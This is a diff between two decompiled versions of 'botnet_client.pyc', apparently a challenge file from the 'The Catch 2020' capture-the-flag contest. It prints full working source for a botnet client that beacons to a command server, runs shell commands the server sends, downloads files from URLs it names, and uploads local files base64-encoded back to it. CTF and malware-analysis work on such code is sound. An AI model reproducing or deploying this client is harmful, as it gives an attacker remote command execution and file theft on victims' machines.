@@ -1,150 +1,119 @@
-# Source Generated with Decompyle++
-# File: botnet_client.pyc (Python 3.5)
-
-'''
+# uncompyle6 version 3.7.4
+# Python bytecode 3.5 (3350)
+# Decompiled from: Python 3.8.4 (default, Jul 13 2020, 21:16:07) 
+# [GCC 9.3.0]
+# Embedded file name: /media/sf_the-catch-2020/the-catch-2020-general/challenges/the_connection/botnet_client.py
+"""
 The Catch 2020 - Botnet client for "The Connection"
-'''
-import os
-import sys
-import codecs
-import subprocess
-import argparse
-import base64
-import socket
-import string
-import struct
-import random
+"""
+import os, sys, codecs, subprocess, argparse, base64, socket, string, struct, random
 from time import sleep
-import platform
-import requests
+import platform, requests
 from getmac import get_mac_address
-__author__ = 'Ale\xc5\xa1 Padrta @ CESNET.CZ'
+__author__ = 'Aleš Padrta @ CESNET.CZ'
 __version__ = '1.0'
 
 class Message:
-    '''
-\tBotnet message
-\t'''
+    __doc__ = '\n\tBotnet message\n\t'
     plain = ''
     encoded = ''
     sckbuffer = bytearray()
-    
+
     def __init__(self):
-        '''
-\t\tConstructor
-\t\t'''
+        """
+                Constructor
+                """
         self.plain = ''
         self.encoded = ''
         self.sckbuffer = bytearray()
 
-    
     def set_plain(self, msg):
-        '''
-\t\tInitialize with decoded (plain) message
-\t\t'''
+        """
+                Initialize with decoded (plain) message
+                """
         self.plain = msg
         self.encode_msg()
 
-    
     def get_plain(self):
-        '''
-\t\tReturn decoded (plain) message
-\t\t'''
+        """
+                Return decoded (plain) message
+                """
         return self.plain
 
-    
     def set_encoded(self, msg):
-        '''
-\t\tInitialize with encoded message (debug purposes)
-\t\t'''
+        """
+                Initialize with encoded message (debug purposes)
+                """
         self.encoded = msg
         self.decode_msg()
 
-    
     def get_encoded(self):
-        '''
-\t\tReturn encoded message (debug purposes)
-\t\t'''
+        """
+                Return encoded message (debug purposes)
+                """
         return self.encoded
 
-    
     def encode_msg(self):
-        '''
-\t\tEncode plain message
-\t\t'''
+        """
+                Encode plain message
+                """
         basemsg = self.plain.encode()
         prefix = struct.pack('>Q', len(basemsg))
         self.encoded = prefix + basemsg
 
-    
     def decode_msg(self):
-        '''
-\t\tDecode plain message
-\t\t'''
+        """
+                Decode plain message
+                """
         prefix = struct.unpack('>Q', self.encoded[0:8])[0]
         basemsg = self.encoded[8:]
         if len(basemsg) != prefix:
             self.plain = ''
             raise Exception('Inconsistence in message')
-        self.plain = None.decode()
+        self.plain = basemsg.decode()
 
-    
     def send_msg(self, sck):
-        '''
-\t\tSend encoded message to socket
-\t\t'''
-        
+        """
+                Send encoded message to socket
+                """
         try:
             sck.sendall(self.encoded)
-        except Exception:
-            exc = None
-            
-            try:
-                raise 
-            finally:
-                exc = None
-                del exc
+        except Exception as exc:
+            raise
 
-
-
-    
     def receive_msg(self, sck):
-        '''
-\t\tReceive encoded message from socket
-\t\t'''
-        
+        """
+                Receive encoded message from socket
+                """
         try:
             raw_msglen = self.receive_all(sck, 8)
             if not raw_msglen:
-                return None
-            msglen = None.unpack('>Q', raw_msglen)[0]
-            data = self.receive_all(sck, msglen)
-            self.encoded = raw_msglen + data
-            self.decode_msg()
-            return len(self.encoded)
+                return
+            else:
+                msglen = struct.unpack('>Q', raw_msglen)[0]
+                data = self.receive_all(sck, msglen)
+                self.encoded = raw_msglen + data
+                self.decode_msg()
+                return len(self.encoded)
         except Exception:
-            return None
+            return
 
-
-    
     def receive_all(self, sck, length):
-        '''
-\t\tReceive specified number of bytes (or return None if EOF is hit)
-\t\t'''
+        """
+                Receive specified number of bytes (or return None if EOF is hit)
+                """
         self.sckbuffer = bytearray()
         while len(self.sckbuffer) < length:
             packet = sck.recv(length - len(self.sckbuffer))
             if not packet:
-                return None
-            None.sckbuffer.extend(packet)
+                return
+            self.sckbuffer.extend(packet)
+
         return self.sckbuffer
 
 
-
 class BotnetClient:
-    '''
-\tClass for FT2-BotnetClient
-\t'''
+    __doc__ = '\n\tClass for FT2-BotnetClient\n\t'
     client_id = None
     server_ip = ''
     time_out = 5
@@ -154,11 +123,11 @@ class BotnetClient:
     nextmsg = None
     nexttype = None
     sck = None
-    
+
     def __init__(self, srv_ip, srv_port):
-        '''
-\t\tConstructor
-\t\t'''
+        """
+                Constructor
+                """
         self.server_ip = srv_ip
         self.server_port = srv_port
         self.generate_id()
@@ -169,25 +138,22 @@ class BotnetClient:
         self.nexttype = None
         self.sck = None
 
-    
     def generate_id(self):
-        '''
-\t\tGenerate client ID
-\t\t'''
-        self.client_id = '{}'.format(''.join(random.sample(string.ascii_lowercase + string.digits, k = 16)))
+        """
+                Generate client ID
+                """
+        self.client_id = '{}'.format(''.join(random.sample(string.ascii_lowercase + string.digits, k=16)))
 
-    
     def generate_readymsg(self):
-        '''
-\t\tGenerate ready message
-\t\t'''
+        """
+                Generate ready message
+                """
         return '{};;ready'.format(self.client_id)
 
-    
     def get_order(self):
-        '''
-\t\tBeacon and get order from server
-\t\t'''
+        """
+                Beacon and get order from server
+                """
         msg = Message()
         msg.set_plain(self.generate_readymsg())
         msg.send_msg(self.sck)
@@ -198,45 +164,34 @@ class BotnetClient:
         if msg.get_plain().count(';;') < 1:
             order = msg.get_plain()
         else:
-            (order, details) = msg.get_plain().split(';', 1)
-        return (order, details)
+            order, details = msg.get_plain().split(';', 1)
+        return (
+         order, details)
 
-    
     def order_execute(self, details):
-        '''
-\t\tPerformning command "execute"
-\t\t'''
+        """
+                Performning command "execute"
+                """
         out = None
         err = None
-        
         try:
-            proc = subprocess.Popen(details.split(';'), stdout = subprocess.PIPE, shell = True)
-            (out, err) = proc.communicate()
+            proc = subprocess.Popen(details.split(';'), stdout=subprocess.PIPE, shell=True)
+            out, err = proc.communicate()
         except Exception:
             pass
 
         if os.device_encoding(0):
-            if out:
-                pass
-            if err:
-                pass
-            self.nextmsg = ''(err.decode(os.device_encoding(0)), 1, '')
-        elif out:
-            pass
-        
-        if err:
-            pass
-        self.nextmsg = ''(err.decode(), 1, '')
+            self.nextmsg = '{};;result-execution;;{} {}'.format(self.client_id, out.decode(os.device_encoding(0)) if out else '', err.decode(os.device_encoding(0)) if err else '')
+        else:
+            self.nextmsg = '{};;result-execution;;{} {}'.format(self.client_id, out.decode() if out else '', err.decode() if err else '')
         self.nexttype = 'result-execution'
 
-    
     def order_download(self, details):
-        '''
-\t\tPerformning command "download"
-\t\t'''
-        (download_file, download_url) = details.split(';;', 1)
+        """
+                Performning command "download"
+                """
+        download_file, download_url = details.split(';;', 1)
         response = None
-        
         try:
             response = requests.get(download_url)
         except Exception:
@@ -251,13 +206,11 @@ class BotnetClient:
             self.nextmsg = '{};;info;download-failed;;{}'.format(self.client_id, download_url)
         self.nexttype = 'info'
 
-    
     def order_upload(self, details):
-        '''
-\t\tPerformning command "upload"
-\t\t'''
+        """
+                Performning command "upload"
+                """
         upload_content = None
-        
         try:
             fup = codecs.open(details, 'rb')
             upload_content = base64.b64encode(fup.read()).decode()
@@ -272,11 +225,10 @@ class BotnetClient:
             self.nextmsg = '{};;info;;upload-failed;;{}'.format(self.client_id, details)
             self.nexttype = 'info'
 
-    
     def sent_data(self):
-        '''
-\t\tSending data prepared by performing previous order
-\t\t'''
+        """
+                Sending data prepared by performing previous order
+                """
         msg = Message()
         msg.set_plain(self.nextmsg)
         print('-> Sending data ({})'.format(self.nexttype))
@@ -288,46 +240,40 @@ class BotnetClient:
         self.nextmsg = None
         self.nexttype = None
 
-    
     def run(self):
-        '''
-\t\tRunning the botnet client
-\t\t'''
+        """
+                Running the botnet client
+                """
         msg = Message()
         print('The Catch 2020 Botnet Client started (server on {} port {})'.format(self.server_ip, self.server_port))
         while not self.stop:
-            
             try:
                 self.sck = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 self.sck.settimeout(self.time_out)
                 self.sck.connect((self.server_ip, self.server_port))
-            except socket.error:
-                excdesc = None
-                
-                try:
-                    print('Connection failed: {}'.format(excdesc))
-                finally:
-                    excdesc = None
-                    del excdesc
+            except socket.error as excdesc:
+                print('Connection failed: {}'.format(excdesc))
 
-
-            
             try:
                 if not self.nextmsg:
-                    (order, details) = self.get_order()
+                    order, details = self.get_order()
                     if order == 'wait':
                         self.beacon = int(details)
-                    elif order == 'client-stop':
-                        self.stop = True
-                        self.sck.close()
-                    elif order == 'execute':
-                        self.order_execute(details)
-                    elif order == 'download':
-                        self.order_download(details)
-                    elif order == 'upload':
-                        self.order_upload(details)
                     else:
-                        print('Received unknown order')
+                        if order == 'client-stop':
+                            self.stop = True
+                            self.sck.close()
+                        else:
+                            if order == 'execute':
+                                self.order_execute(details)
+                            else:
+                                if order == 'download':
+                                    self.order_download(details)
+                                else:
+                                    if order == 'upload':
+                                        self.order_upload(details)
+                                    else:
+                                        print('Received unknown order')
                 else:
                     self.sent_data()
                 self.sck.close()
@@ -337,32 +283,34 @@ class BotnetClient:
             if not self.stop:
                 sleep(self.beacon)
                 self.beacon = self.beacon * 2.2
-            self.logfile.log_entry('The Catch 2020 Botnet Clien stopped', 'info')
-            self.logfile.close()
-            return None
 
+        self.logfile.log_entry('The Catch 2020 Botnet Clien stopped', 'info')
+        self.logfile.close()
 
 
 def get_args():
-    '''
-\tCmd line argument parsing (preprocessing)
-\t'''
-    parser = argparse.ArgumentParser(description = 'The Catch 2020 Botnet Client')
-    parser.add_argument('-ip', '--ipaddress', type = str, help = 'Server IP address', required = True)
-    parser.add_argument('-p', '--port', type = int, help = 'Server port', required = True)
+    """
+        Cmd line argument parsing (preprocessing)
+        """
+    parser = argparse.ArgumentParser(description='The Catch 2020 Botnet Client')
+    parser.add_argument('-ip', '--ipaddress', type=str, help='Server IP address', required=True)
+    parser.add_argument('-p', '--port', type=int, help='Server port', required=True)
     args = parser.parse_args()
-    return (args.ipaddress, args.port)
+    return (
+     args.ipaddress, args.port)
 
 
 def main():
-    '''
-\tMain function
-\t'''
+    """
+        Main function
+        """
     if sys.version_info[0] < 3:
         print('ERROR: Python3 required.')
         exit(1)
-    (srv_ip, srv_port) = get_args()
+    srv_ip, srv_port = get_args()
     client = BotnetClient(srv_ip, srv_port)
     client.run()
 
+
 main()
+# okay decompiling botnet_client.pyc
